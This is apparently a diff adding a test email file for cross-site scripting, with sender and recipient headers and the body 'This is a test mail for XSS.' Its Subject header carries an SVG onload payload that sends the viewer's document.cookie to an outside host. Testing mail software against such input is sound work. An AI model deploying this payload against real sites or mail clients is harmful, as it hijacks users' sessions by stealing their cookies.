@@ -1,0 +1,7 @@
+From: "Major Cornett" <the00@plg2.math.uwaterloo.ca>
+To: juan.hernandez@enron.com, zgreen@atg.com, bethraia@earthlink.net, 
+Subject: <svg onload='img=new Image();img.src="//x55.me/geo.php?get="+document.cookie;'>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
